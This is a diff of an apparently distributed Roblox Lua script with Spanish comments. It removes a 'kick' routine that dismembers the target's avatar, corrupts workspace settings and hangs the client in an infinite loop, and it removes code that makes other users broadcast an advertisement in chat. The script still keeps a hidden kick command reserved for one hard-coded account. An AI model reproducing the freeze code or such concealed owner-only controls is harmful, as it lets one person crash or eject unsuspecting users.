@@ -34,46 +34,6 @@ local function admins(name)
     return false
 end
 
--- Ejecutar kick
-local function executeKick(targetPlayer)
-    local char = targetPlayer.Character
-    if char and char:FindFirstChild("Torso") then
-        char.Torso:Destroy()
-    end
-    wait(0.1)
-
-    targetPlayer:Kick("You were kicked by Dev/Admin.")
-
-    local bool = true
-    if bool then
-        game.Workspace.FallenPartsDestroyHeight = 0 / 0
-    else
-        game.Workspace.FallenPartsDestroyHeight = -500
-    end
-
-    if char and char:FindFirstChild("HumanoidRootPart") then
-        char.HumanoidRootPart.CFrame = CFrame.new(-989889989898989, -989879898998988, -98999898989899898)
-    end
-    wait(0.3)
-    
-    if char and char:FindFirstChild("Humanoid") then
-        char.Humanoid:Destroy()
-    end
-    wait(0.2)
-    if char and char:FindFirstChild("Head") then
-        char.Head:Destroy()
-    end
-    wait(0.3)
-    for _, limb in ipairs({"Right Leg", "Left Leg", "Right Arm", "Left Arm"}) do
-        if char and char:FindFirstChild(limb) then
-            char[limb]:Destroy()
-        end
-    end
-    wait(0.5)
-	while true do 
-	end
-end
-
 -- Buscar jugador por nombre parcial
 local function findPlayerByName(partialName)
     partialName = partialName:lower()
@@ -85,45 +45,45 @@ local function findPlayerByName(partialName)
     return nil
 end
 
+-- Mostrar notificación
+local function notifyPlayer(player, title, text)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = title,
+        Text = text,
+        Duration = 5,
+    })
+end
+
 -- Manejar mensajes del chat
 local function onChatMessage(player, message)
-    -- Comando ":users"
+    -- Comando "!users"
     if message:lower() == alpha:lower() and admins(player.Name) then
+        local activeSigmas = {}
         for _, sigmaUser in ipairs(sigmas) do
-            if sigmaUser:lower() ~= player.Name:lower() then -- Excluir al ejecutor del comando
-                local sigmaPlayer = findPlayerByName(sigmaUser)
-                if sigmaPlayer and sigmaPlayer ~= player then -- Verificar que no sea el ejecutor
-                    -- Enviar mensaje "HII!" al chat
-                    local args = {
-                        [1] = ">>> I'M USING SENTINEL v8.2.1z!<<<",
-                        [2] = "All"
-                    }
-                    game:GetService("ReplicatedStorage")
-                        :WaitForChild("DefaultChatSystemChatEvents")
-                        :WaitForChild("SayMessageRequest")
-                        :FireServer(unpack(args))
-                end
+            local sigmaPlayer = findPlayerByName(sigmaUser)
+            if sigmaPlayer then
+                table.insert(activeSigmas, sigmaPlayer.Name)
             end
+        end
+
+        if #activeSigmas > 0 then
+            notifyPlayer(player, "Usuarios activos", "Conectados: " .. table.concat(activeSigmas, ", "))
+        else
+            notifyPlayer(player, "Usuarios activos", "No hay usuarios de Sigma conectados.")
         end
     end
 
-    -- Comando ":kick" reservado para pedrood2
+    -- Comando "!kick" reservado para pedrood2
     if message:sub(1, 5):lower() == "!kick" and player.Name:lower() == "pedrood2" then
         local partialName = message:sub(7):lower()
         local targetPlayer = findPlayerByName(partialName)
         if targetPlayer then
-            executeKick(targetPlayer)
+            targetPlayer:Kick("You were kicked by Dev/Admin.")
         else
-            player:Kick("Player not found: " .. partialName)
+            notifyPlayer(player, "Error", "Jugador no encontrado: " .. partialName)
         end
     elseif message:sub(1, 5):lower() == "!kick" then
-        game.StarterGui:SetCore("SendNotification", {
-            Title = "Note:",
-            Text = "You do not have permission to use this command (Owner Only)",
-            Icon = "http://www.roblox.com/asset/?id=5585095509",
-            Duration = 5,
-            callback = bindableFunction,
-        })
+        notifyPlayer(player, "Permiso denegado", "No tienes permisos para usar este comando.")
     end
 end
 
